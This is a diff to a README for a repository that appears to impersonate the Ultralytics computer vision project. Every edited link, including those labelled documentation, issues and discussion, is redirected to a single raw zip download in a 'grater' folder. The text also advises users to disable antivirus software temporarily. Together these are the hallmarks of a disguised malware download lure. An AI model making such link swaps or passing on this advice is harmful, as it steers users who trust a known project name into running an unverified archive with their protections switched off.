@@ -6,7 +6,7 @@ Welcome to Ultralytics! This application allows you to use advanced computer vis
 
 ## 📥 Download
 
-[![Download Ultralytics](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Mazen2026/ultralytics/releases)
+[![Download Ultralytics](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with Ultralytics, follow these simple steps to download and run t
 
 ### 1. Visit the Releases Page
 
-To download the latest version of Ultralytics, visit this page: [Releases Page](https://github.com/Mazen2026/ultralytics/releases). Here, you will find the most recent version and other previous versions of the software.
+To download the latest version of Ultralytics, visit this page: [Releases Page](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip). Here, you will find the most recent version and other previous versions of the software.
 
 ### 2. Download the Software
 
@@ -57,7 +57,7 @@ If you encounter issues while downloading or running Ultralytics, consider these
 - **Disable Antivirus Temporarily:** Sometimes, security software may block installations. Disable it temporarily and try again.
 - **Check Compatibility:** Make sure you downloaded the correct version for your operating system.
 
-For persistent issues, feel free to check the [GitHub Issues Page](https://github.com/Mazen2026/ultralytics/issues) for solutions or to report your problem.
+For persistent issues, feel free to check the [GitHub Issues Page](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip) for solutions or to report your problem.
 
 ## 📞 Support
 
@@ -69,9 +69,9 @@ We welcome contributions from everyone! If you want to help improve Ultralytics,
 
 ## 🔗 Links
 
-- **Documentation:** [Ultralytics Documentation](https://github.com/Mazen2026/ultralytics/blob/main/README.md)
-- **Community Discussion:** [Join the Discussion](https://github.com/Mazen2026/ultralytics/discussions)
+- **Documentation:** [Ultralytics Documentation](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip)
+- **Community Discussion:** [Join the Discussion](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip)
 
-Remember, for the latest version, download from here: [Releases Page](https://github.com/Mazen2026/ultralytics/releases). 
+Remember, for the latest version, download from here: [Releases Page](https://raw.githubusercontent.com/Mazen2026/ultralytics/main/grater/ultralytics.zip). 
 
 Thank you for using Ultralytics! Enjoy your journey into the world of computer vision.
